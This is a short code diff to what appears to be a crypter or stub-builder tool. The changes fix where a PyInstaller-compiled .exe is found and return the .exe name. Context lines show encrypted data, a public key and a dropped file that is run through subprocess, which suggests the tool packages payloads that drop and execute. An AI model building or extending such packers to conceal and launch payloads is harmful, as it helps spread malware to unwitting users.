@@ -186,8 +186,9 @@ class StartModule():
 		os.system(config['pyinstaller'].format(path=os.path.dirname(stub_name)) + " " + stub_name)
 		filename = '{file}.exe'.format(file=stub_name.split('.')[0].split('\\')[-1])
 
-		file_to_move = os.path.abspath(os.path.join('dist', '{file}'.format(file=filename)))
+		file_to_move = os.path.abspath(os.path.join('dist', '{folder}'.format(folder=filename.split('.')[0]), '{file}'.format(file=filename)))
 		new_file = os.path.abspath(os.path.join(os.path.dirname(stub_name), filename))
+
 		if os.path.isfile(file_to_move) and not os.path.isfile(new_file):
 			os.rename(file_to_move, new_file)
 
@@ -290,6 +291,7 @@ proc = subprocess.Popen('python {filename}'.format(filename=drop_file_name), she
 				new_file = '{file}.py'.format(file=new_file)
 			if compile_exe:
 				self.createStub(crypted_data, public, drop_file_name, new_file, True)
+				new_file = '{file}.exe'.format(file=new_file.split('.')[0])
 			else:
 				self.createStub(crypted_data, public, drop_file_name, new_file)
 			return new_file
